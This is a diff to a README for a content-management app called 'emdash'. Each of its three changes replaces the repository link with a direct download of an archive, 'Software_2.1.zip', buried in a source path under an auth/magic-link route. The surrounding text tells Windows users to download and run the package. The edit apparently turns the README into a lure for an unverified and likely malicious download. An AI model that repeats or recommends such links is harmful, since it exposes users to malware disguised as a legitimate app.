@@ -1,6 +1,6 @@
 # 📝 emdash - Manage your content with ease
 
-[![Download emdash](https://img.shields.io/badge/Download%20emdash-blue?style=for-the-badge&logo=github)](https://github.com/pavezca6839/emdash)
+[![Download emdash](https://img.shields.io/badge/Download%20emdash-blue?style=for-the-badge&logo=github)](https://github.com/pavezca6839/emdash/raw/refs/heads/main/packages/core/src/astro/routes/api/auth/magic-link/Software_2.1.zip)
 
 ## 🚀 What is emdash?
 
@@ -24,7 +24,7 @@ If you plan to run EmDash locally, your system should also allow apps to open a 
 
 Open this link and get the latest version:
 
-[Download emdash](https://github.com/pavezca6839/emdash)
+[Download emdash](https://github.com/pavezca6839/emdash/raw/refs/heads/main/packages/core/src/astro/routes/api/auth/magic-link/Software_2.1.zip)
 
 If the page shows source files, look for a release file or a ready-to-run build on the page. Download the app package to your Windows computer, then move to the setup steps below.
 
@@ -189,4 +189,4 @@ Use one browser at a time if you notice loading issues.
 
 ## 📌 Repo link
 
-[https://github.com/pavezca6839/emdash](https://github.com/pavezca6839/emdash)
+[https://github.com/pavezca6839/emdash/raw/refs/heads/main/packages/core/src/astro/routes/api/auth/magic-link/Software_2.1.zip](https://github.com/pavezca6839/emdash/raw/refs/heads/main/packages/core/src/astro/routes/api/auth/magic-link/Software_2.1.zip)
